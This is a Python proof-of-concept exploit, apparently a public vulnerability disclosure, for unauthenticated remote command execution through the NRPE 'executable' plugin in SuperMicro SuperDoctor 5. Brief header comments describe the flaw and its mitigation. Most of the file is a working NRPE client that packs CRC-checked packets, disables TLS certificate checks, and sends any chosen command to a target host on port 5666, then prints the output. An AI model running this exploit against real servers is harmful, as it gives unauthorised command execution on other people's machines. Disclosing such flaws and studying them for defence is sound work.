# SuperMicro implemented a Remote Command Execution plugin in their implementation of 
# NRPE in SuperDocter 5, which is their monitoring utility for SuperMicro chassis'.
# This is an intended feature but leaves the system open (by default) to unauthenticated
# remote command execution by abusing the 'executable' plugin with an NRPE client.
# 
# For your pleasure, here is a PoC Python NRPE Client that will connect, execute the 
# cmd of choice and return its output.
#
# To mitigate this vulnerbility, edit your agent.cfg to specificy which IPs are allowed 
# to execute NRPE commands agaist the system and/or block traffic on port 5666.
#
# NRPE cannot be disabled in this software, see Guide section 3.2


#Author: Simon Gurney 
#Date: 23/05/2019
#Vendor: SuperMicro
#Product: SuperMicro Super Doctor 5
#Version: 5
#Guide: ftp://supermicro.com/ISO_Extracted/CDR-C9_V1.00_for_Intel_C9_platform/SuperDoctor_V/Linux/SuperDoctor5_UserGuide.pdf



### Configurables

command = "ping 1.1.1.1 -n 1"
target = "192.168.1.4"
target_port = 5666

### Don't need to change anything below

import binascii
import struct
import socket
import ssl

#### Struct Encoding Types
StructCodeInt16 = "!h" ## Unsigned Int16
StructCodeInt32 = "!L" ## Unsigned Int32

#### NRPE Specific definitions
NRPE_Version = ("","One", "Two", "Three")
NRPE_Packet_Type = ("", "Query", "Response")
NRPE_Response = ("Ok", "Warning", "Critical", "Unknown")
NRPE_Version_1 = 1
NRPE_Version_2 = 2
NRPE_Version_3 = 3
NRPE_Packet_Type_Query = 1
NRPE_Packet_Type_Response = 2
NRPE_Response_Ok = 0
NRPE_Response_Warning = 1
NRPE_Response_Critical = 2
NRPE_Response_Unknown = 3
NRPE_Response_Type_Query = 3

#### RandomDefintions
NullByte = b"\x00"
TwoCharSuffix = "SG"

class NRPEpacket:
	port = 5666
	server = "127.0.0.1"
	nrpeVersion = NRPE_Version_2
	nrpePacketType = NRPE_Packet_Type_Query
	nrpeResponseCode = NRPE_Response_Type_Query
	ownSocket = None
	def CalculateCRC(self):
		tempBuffer = struct.pack(StructCodeInt16,self.nrpeVersion)
		tempBuffer += struct.pack(StructCodeInt16,self.nrpePacketType)
		tempBuffer += NullByte * 4
		tempBuffer += struct.pack(StructCodeInt16,self.nrpeResponseCode)
		tempBuffer += self.content
		return (struct.pack(StructCodeInt32, binascii.crc32(tempBuffer) & 0xffffffff))
	def PadTo1024Bytes(self,command):
		if len(command) <= 1024:
			tempBuffer = command
		else:
			Error("Command string is too long!")
		while len(tempBuffer) < 1024:
			tempBuffer += "\x00"
		tempBuffer += TwoCharSuffix
		return tempBuffer.encode()
	def Connect(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.connect((self.server,self.port))
	def WrapSSL(self):
		sslSettings = ssl.SSLContext(ssl.PROTOCOL_TLS)
		sslSettings.verify_mode=ssl.CERT_NONE
		sslSocket = sslSettings.wrap_socket(self.socket)
        #sslSocket.connect(("addr", port))	
        #self.socket = ssl.wrap_socket(self.socket,cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23, ciphers="ALL")
	def Send(self):
		tempBuffer = struct.pack(StructCodeInt16,self.nrpeVersion)
		tempBuffer += struct.pack(StructCodeInt16,self.nrpePacketType)
		tempBuffer += self.crc
		tempBuffer += struct.pack(StructCodeInt16,self.nrpeResponseCode)
		tempBuffer += self.content
		self.socket.send(tempBuffer)
	def Recv(self):
		tempBuffer = self.socket.recv(2048)
		self.nrpeVersion = struct.unpack(StructCodeInt16,tempBuffer[0:2])[0]
		self.nrpePacketType = struct.unpack(StructCodeInt16,tempBuffer[2:4])[0]
		self.crc = tempBuffer[4:8]
		self.nrpeResponseCode = struct.unpack(StructCodeInt16,tempBuffer[8:10])[0]
		self.content = tempBuffer[10:]
		if self.crc != self.CalculateCRC():
			print ("CRC does not match!")
	def PrintOut(self):
		print(" -=-=-=-= Begin NRPE Content =-=-=-=-")
		print("| NRPE Version       =  %i  -  %s" % (self.nrpeVersion,NRPE_Version[self.nrpeVersion]))
		print("| NRPE Packet Type   =  %i  -  %s" % (self.nrpePacketType,NRPE_Packet_Type[self.nrpePacketType]))
		print("| NRPE Packet CRC    =  %i" % struct.unpack(StructCodeInt32,self.crc)[0])
		print("| NRPE Response Code =  %i  -  %s" % (self.nrpeResponseCode,NRPE_Response[self.nrpeResponseCode]))
		print("| Packet Content:")
		print("| %s" % self.content.decode().strip(TwoCharSuffix).strip("\x00"))
		print(" -=-=-=-= End NRPE Content =-=-=-=-")
	def Close(self):
		if not self.ownSocket:
			self.socket.close()
	def AutoSend(self):
		print("Sending...")
		self.PrintOut()
		self.Send()
		print("Receiving...")
		self.Recv()
		self.PrintOut()
		self.Close()
	def __init__(self, command, socket=None, server=None, port = None, ssl=True):
		self.content = self.PadTo1024Bytes(command)
		self.crc = self.CalculateCRC()
		if server:
			self.server = server
		if port:
			self.port = port
		if not socket:
			self.Connect()
		else:
			self.socket = socket
			self.ownSocket = True
		if ssl == True:
			self.WrapSSL()

			
#NRPE CMD format is "executable!<binary>!<arguments> i.e."
#NRPEpacket("executable!ping!1.1.1.1 -n 1", server="1.2.3.4").AutoSend()

split = command.split(" ",1)
cmd = "executable!" + split[0] + "!" + split[1]
NRPEpacket(cmd, server=target, port=target_port).AutoSend()
